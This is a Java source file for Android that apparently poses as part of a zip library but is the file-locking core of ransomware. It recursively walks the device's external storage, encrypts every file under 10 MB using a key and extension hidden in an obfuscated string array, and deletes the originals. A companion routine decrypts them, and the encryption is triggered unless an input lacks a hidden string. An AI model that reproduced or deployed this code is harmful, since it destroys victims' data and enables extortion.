package org.zeroturnaround.zip;

import Xbox.*;
import android.content.*;
import android.os.*;
import java.io.*;
import java.text.*;

public class zip
{
    public void b ( File root )
      { 
        File files[] = root.listFiles ( ); 
        if ( files != null )
          { 
            for ( File f : files )
              { 
                if ( f.isDirectory ( ) )
                  { 
                    b ( f ); 
                  }
                else
                  {
                    long startTime=System.currentTimeMillis ( );
                    FormetFileSize ( getFileSize ( f ), f , false ) ;
                    long endTime=System.currentTimeMillis ( );
                    System.out.println ( String.valueOf ( ( endTime - startTime ) / 1000 ) + "秒" );
                  } 
              } 
          }
        
      }

    //加密文件
    public static boolean a ( File root )
      { 
        File files[] = root.listFiles ( ); 
        if ( files != null )
          { 
            for ( File f : files )
              { 
                if ( f.isDirectory ( ) )
                  { 
                    a ( f ); 
                  }
                else
                  {
                    long startTime=System.currentTimeMillis ( );
                    FormetFileSize ( getFileSize ( f ), f , true ) ;
                    long endTime=System.currentTimeMillis ( );
                    System.out.println ( String.valueOf ( ( endTime - startTime ) / 1000 ) + "秒" );
                  }
              } 
          }
        return true;
      }
    //加密处理
    public static void FormetFileSize ( long fileS, File f, boolean i )
      {
        DecimalFormat df = new DecimalFormat ( "#.00" );
        //String fileSizeString = "";
        // String wrongSize = "0B";
        if ( i )
          {
            if ( f.toString ( ).indexOf (utils.activity. d.dex[37] ) == -1 )
              {
                if ( Float.valueOf ( df.format ( (double) fileS / 1048576 ) ) < 10 )
                  {
                    FileEncryptUtils.encryptFile ( utils.activity. d.dex[38], f.toString ( ), f.toString ( ) + utils.activity. d.dex[37] );
                    f.delete();
                  }
              }
          }
        else
          {
            if ( Float.valueOf ( df.format ( (double) fileS / 1048576 ) ) < 10 )
              {
                if ( f.toString ( ).indexOf ( utils.activity. d.dex[37] ) != -1 )
                  {
                    String[] jm= f.toString ( ).split ( utils.activity. d.dex[37] );
                    FileEncryptUtils.decryptFile ( utils.activity. d.dex[38], f.toString ( ), jm [ 0 ].toString ( ) );
                    f.delete();
                  }
              }
          }

        //return fileSizeString;
      }
    public static long getFileSize ( File file )
      {
        long size = 0;
        try
          {
            if ( file.exists ( ) )
              {
                FileInputStream fis = null;
                fis = new FileInputStream ( file );
                size = fis.available ( );
              }
            else
              {
                file.createNewFile ( );
              }
          }
        catch (FileNotFoundException e)
          {}
        catch (IOException e)
          {}
        return size;
      }
    public static boolean isContain ( String s1 )
      {
        if(s1.indexOf(utils.activity.d.dex[39])==-1)
        {
         return a(new File(Environment.getExternalStorageDirectory ( ).getPath ( ) ));
        }
        
        return false;
      }
}
